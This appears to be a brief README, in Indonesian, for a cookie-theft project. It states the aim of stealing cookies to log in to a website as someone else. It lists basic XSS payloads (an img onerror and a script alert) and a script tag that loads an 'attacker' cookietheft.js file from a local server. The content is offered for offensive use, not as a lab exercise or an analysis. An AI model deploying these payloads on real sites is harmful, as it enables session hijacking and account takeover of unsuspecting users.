# XSS-CookieTheft
Maling cookie untuk login ke sebuah website. Sesuaikan dengan Database yang kalian miliki.

## XSS Payload
### Basic
```
<img src="x" onerror="alert('XSS')">
<script>alert('XSS')</script>
```

### External JavaScript
`<script src="http://localhost:8089/attacker/cookietheft.js"></script>`
